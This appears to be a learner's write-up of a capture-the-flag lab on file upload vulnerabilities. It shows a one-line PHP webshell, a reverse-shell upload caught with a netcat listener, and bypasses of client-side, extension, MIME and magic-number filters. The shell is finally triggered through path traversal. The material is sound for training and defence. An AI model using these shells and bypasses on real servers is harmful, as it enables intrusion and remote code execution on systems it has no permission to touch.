# Introduction
Uploading files to a server is a integral part of the useage of the web, if it is uploading a (profile) picture, a report to a cloud storage or a project on Github, there are a number of applications for file uploading.
Being able to upload a file can also be a severe vulnerability, as when not implemented correctly it can lead to minor problems all the way up to *Remote Code Execution (RCE)*.
The possible attacks discussed here are:
- Overwriting existing files on a server
- Uploading and executing shells on a server
- Bypassing Client-Side filtering
- Bypassing various kinds of Server-Site filtering
- Fooling content type validation checks
# Methodology
As always ennumeration is the most important part and to find out the most about your target you can:
- Look at the page's source code to see if *client-side filtering* is applied
- Scan with a directory bruteforcer such as [Gobuster](https://github.com/OJ/gobuster) (install with  `sudo apt install gobuster`)
- Intercept upload requests with *[[Burp Suite]]*  
- Use [Wappalyser](https://www.wappalyzer.com/) to find more information about the website

After having a basic understanding how the website handles our input we can try to upload something to see what we can and can not upload.
If *client-side filtering* is active we can look at the source code and try to bypass it. 
In the case of *server-side filtering* we have to find out what filter is applied, upload a file and try something different based on the error message.

1. Enummerate the web site with tools like [Wappalyser](https://www.wappalyzer.com/), which gives indicators with what language and framework the web site has been built with
2. Make requests and capture responses with *Burp Suite*, pay attention to headers like `server` and `x-powered-by`
3. Look for attack vectors, such as an upload page
4. After finding an upload page, inspec it; look at the source code of the page to see if there are client side filter in place
5. Upload innocent files and use [Gobuster](https://github.com/OJ/gobuster) to see where the uploads are stored; you can use gobuster with the `-x` switch  to look for specific file extensions (f.e. `-x php,txt,html`)
6. After knowing where the files are stored and how to access them we can go on and try to upload malicouse files, paying attention what hints the error messages can give us

If there is *server-side filtering* in place we can try different ways to determin what filter are used:
- If a file with an invalid file type (`testfile.invalidextension`) the web site may use a blacklist, if the upload fails it may use a whitelist
- Try to upload the innocent file but change the magic number, if it is filtered the web site uses a magic number based filter
- Upload a innocent file, capture the request and change the MIME type using *Burp Suite*, if it is filtered the web site looks for the MIME type of the file
- Upload progressively larger files to see if a file length filter is in place
# Overwriting Existing Files
When a file is uploaded to a server some checks should be made to ensure no existing file is overwritten. It is common that a new name will be assigned to the file, either random or with the data and time it was uploaded. It can also be checked if the name of the file already exists on the server and a error message is returned.
It is very likely that in a real world scenario file permissions will prevent you from doing significant harm with this attack, but it is still worth to keep an eye out for in a pentest or bug hunting environment.

**Example**
We are visiting a website which displays a picture of a spaniel, which we want to overwrite.
1. We take a look at the source code of the website and discover that the picture is sourced from a file named "spaniel.jpg" inside a directory called "images"
2. We download a image, name it "spaniel.jpg" and upload it to the website
3. The picture we downloaded should now be displayed instead of the original

We have successfully overwritten the file, although in most cases you have to do more enummeration than look at the page's source code.

**Exercise**
1. We visit a website with a banner "File Overwriting" and two buttons "Select File" and "Upload", in the background we can see a picture of a montain
2. We look at the source code of the page and see: 
```
<img src="images/mountains.jpg" alt="">
``` 
3. We download or use some picture we already have, name it "mountains.jpg" and upload it
4. The text "Well done -- you overwrote the file!" is displayed along with the flag
# Remote Code Execution (RCE)
Uploading a payload, that allows RCE, via a upload vulnerability works by uploading a program that is written inthe same language as the back-end of the website or a language that the server understands (f.e. PHP, Python Django, Node.js). 
Most modern web frameworks are routed programmatically, meaning the routes are defined programmaticaly and not by being mapped to the file-system, which makes this method of attack more complicated and less likely.
There are two ways of achieving RCE when exploiting an upload vulnerability:
- **webshell**
- **reverse /bind shell**

A reverse shell is the ideal goal, however if there is a file length limit or a firewall prevents network-based shells, a web shell may be the only option.

**Examples**

**Web shell**
1. We visit a web site with an upload form
2. We do a *gobuster* scan and discover the directories "/uploads" and "/assets"
```
gobuster dir -u http://demo.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```
3. We upload an image, navigate to `/uploads` and see that our picture is placed there
4. Now we try to upload a simple webshell, which takes a parameter and executes it as a system command. In PHP the syntax is: 
```
<?php echo system($_GET["cmd"]);?>
```
5. We upload the the shell, calling it "webshell.php", and navigate to `/uploads` 
6. We should see our shell placed there

From here we can try to upgrade to a reverse shell or read the files form the system.

**Reverse shell**
The process of uploading a reverse shell is almost identical to that of a web shell
We will use the Pentest Monkey reverse shell, which comes by default with Kali Linux and can be downloaded [here](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php). (You have to change the IP address in line 49 to your own IP address)
1. Start a netcat listener with: 
```
nc -lvnp 1234
```
1. Upload the shell and navigate to `/uploads/shell.php`
2. The web site should not load properly, changing back to the listener we should see that the shell has connected to the listener
3. Now we can stabilise our shell or escalated our privileges

**Exercise**
1. We visit a web site and see two buttons "Select File" and "Upload"
2. We scan the web site with gobuster and discover the directories `/resources` and `/assets`
3. Stored in `/assets` are the components of the website and `/resources` is empty 
4. We upload a valid file and navigate back to `/resources` were we can now see the file 
5. We upload the [Pentest Monkey Shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) (change the IP in line 49 to YOUR IP address), start a netcat listener, navigate to `/resources` and click on the shell
6. We now have a reverse shell and go to `/var/www` to get the flag
# Filtering
There are two categories of filtering:
- *client-side* filtering: happens in your browser, easy to bypass
- *server-side* filtering: runs on the server, more difficult to bypass

**Extension Validation**
File extention filter check the file type to determin if the file is allowed to be uploaded by either:
- blacklist extensions: a list with extentions that are not allowed
- whitelist  extensions: a list with extension that are allowed

This type of filtering is used by MS Windows to identify file types.

**Flle Type Filtering**
Similar to *Extension Validation* this type of filtering checks if the content of the file are acceptable to upload

**1. Multipurpose Internet Mail Extension (MIME)**
MIME is used to identify files, originaly when transfered as an attachement over email, but also used over HTTP(S). MIME can be checked on the client or server side and are easy to bypass as it is based on the extension of the file. 
The filter is attached in the header of the request and has the format `type/subtype`
```
Content-Type: image/jpeg
```

**2. Magic Number Validation**
The magic number of a file is a string of bytes at the beggining (and end) of a file and identify the content of it. 
The magic number of a PNG file is:
```
89 50 4E 47 0D 0A 1A 0A
```

Unix systems use magic numbers to identify files.

**File Length Filtering**
This filter limits the length of a file that can be uploaded. This is in most cases not a problem, but if the form only accepts a file length of 2Kb then the shell we used earlier would be too large as it is 5.4 Kb.

**File Name Filtering**
This filter can work by checking if the given file name already exists in the system or to give them a random file name once uploaded. Additionally, file names should be sanatized meaning there should be no nullbytes, `\`, control characters such as `;` and unicode characters. This means that our file will have a different name after being uploaded, so we have to search our shell.

**File Content Filtering**
This filter will scan the full content of the file to ensure that it is safe to upload.

Usually these filters will be used in conjunction with each other, increasing the security.

# Bypassing Client-Side Filtering
There are four easy ways to bypass average client-side upload filters:
- **Turn of JavaScript in your browser:** is usefull when the website itself does not need JavaScript to work
- **Intercept and modify incoming pages:** we can use *Burp Suite* to intercept the web page and strip the JavaScript filter
- **Intercept and modify the file upload:** we use *Burp Suite* to intercept the upload after the file has been accepted
- **Send the file firectly to the upload point:** With a tool like curl we can post the file directly to the page containing the code for upload handling. We would first have to intercept a successful upload to see the parameters being used. After this we can use the syntax:
```
curl -X POST -F "submit:value" -F "file-parameter:@path-to-file" site
```

**Example: Intercept and modify incoming pages** 
1. We visit a web page with a upload form, look at the source code and find a function checking the MIME type of the file to be uploaded
2. We attempt to upload some files, JPEG files are accepted, everything else rejected
3. We start *Burp Suite*, refresh the page, and capture the request
4. Right click on the request, scroll down to "Do Intercept", select "Response to this request" and forward it
5. We will see the response from the server and can now modify the code, before forwarding it to our browser

*Burp Suite* will not by default intercept external JavaScript files, to change this, go to "Options" and under "Intercept Client Requests", remove `^js$|` in the condition of the first line.

**Example: Intercept and modify the file upload**

1. We choose a file with the permitted extension and *MIME*, for example change "shell.php" to "shell.jpg"
2. Start *Burp Suite*, select the file and upload it
3. In the request change "shell.jpg" back to "shell.php" and the MIME type from "image/jpeg" to "text/x-php"
4. Start a netcat listener and go to `http://demo.uploadvulns.thm/uploads/shell.php`, a connection should then be established

# Bypassing Server-Side Filtering: File Extensions
**Example 1**
1. The web page we visit checks for the last period (`.`) to see if the file has a valid extension.
2. We know that the blacklist if filtering `.php` and `.phtml`
3. We try other PHP extensions to see if any can bypass the filter (like `.php3`, `.php4`, `.phar`)
4. We find out that `.phar` can be uploaded and works, giving us a shell

**Example 2**
This time we do not know upfront what files are being filtered 
1. We upload a harmless  `.jpg` file and see that the upload was successful
2. We try to upload our shell and the see the upload was rejected
3. We first try different PHP extensions but all are rejected
4. We try `shell.jpg.php` as a file name as `.jpg` files are allowed, so the filter may just check if `.jpg` is in the file name
5. The upload is successful, we navigate to `/uploads` and activate the shell

**Exercise**
1. We visit a web page that offers a terminal with the commands "select", "upload" and "chosen"
2. We create a file with the name "test.hellowebpage", which has a invalid extension and try to upload it
3. The upload was successful, so the server has a black list in place
4. We try to upload our shell and it fails
5. We change the extension of our shell to "shell.jpg.php" but the upload still fails
6. After trying out different PHP extensions we bypass the black list with `.php5`
7. Now we have to find our shell so we scan the web site with gobuster
```
gobuster dir -u http://annex.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```
8. We discover two directories "assets" and "privacy", our shell is found in `/privacy`
9. We start a netcat listener, establish a connection and navigate to the flag
```
nc -lvnp 1234
```
# Bypassing Server-Side Filtering: Maigc Numbers
Magic Numbers are a more accurate identifier of files. It is a string of hex digits at the beginning (and end) in a file. Changing the Magic Number of a file can be very effective against PHP based web serves, but can fail against other web server.
1. We upload a harmles `.jpg` image 
2. We first add "AAAA" at the top of our shell code, then we replace them with the JPEG magic number (`FF D8 FF DB`) using [Hexedit](https://linux.die.net/man/1/hexedit) or another hex editor; (we added four characters as the magic number is four bytes long)
3. We upload the shell and now have a connection

**Exercise**
1. We visit a web site with two buttons "Select file" and "Upload"
2. We try to upload a `.png` file but get the error message "GIFs only please!"
3. We download a `.gif` file and upload it successfuly
4. We add "AAAAAA" at the beginning of our shell file and change these with hexedit to 
```
47 49 46 38 39 61
```
5. We can now upload our shell
6. We scan the website with gobuster
```
gobuster dir -u http://magic.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```
7. We navigate to our shell with the URL `http://magic.uploadvulns.thm/graphics/shell.php`
8. We use the shell to get to the flag
# Challenge
1. We visit a web site with a button labeld "Select and Upload"
2. We scan the web site with gobuster and wappalyzer discovering a page `/admin`, directory `/content` and that the website is build with `Node.js`
3. We use gobuster to search for the files in `/conten` , giving us a list with random names
```
gobuster dir -u http://jewel.uploadvulns.thm/content -w <path-to-wordlist> -x jpg
```
4. We inspect the source code and find a script `<script src="assets/js/upload.js"></script>` and the code 
```
<input id="fileSelect" type="file" name="fileToUpload" accept="image/jpeg">
```
3. We upload a innocent `.jpg` file and is accepted
4. We download a `Node.js` reverse shell 
5. We reload the the page and intecept the `upload.js` script and delete the section 
```
//Check File Size
			if (event.target.result.length > 50 * 8 * 1024){
				setResponseMsg("File too big", "red");			
				return;
			}
			//Check Magic Number
			if (atob(event.target.result.split(",")[1]).slice(0,3) != "ÿØÿ"){
				setResponseMsg("Invalid file format", "red");
				return;	
			}
			//Check File Extension
			const extension = fileBox.name.split(".")[1].toLowerCase();
			if (extension != "jpg" && extension != "jpeg"){
				setResponseMsg("Invalid file format", "red");
				return;
			}
```
6. The client-side filter is now gone but when we try to upload our shell it is still denied
7. We try to change the magic number but it still fails
8. We rename our shell to `shell.jpg` to bypass the MIME filter or change it with *Burp Suite* to `image/jpeg`
9. We use gobuster again on the files in `/content`, the file that was not there during our first scan is our shell
10. We start a netcat listener, go to the `/admin` page and enter `../content/name-of-shell.jpg`
11. We now should have a working shell and navigate to `/var/www/` to get the flag
 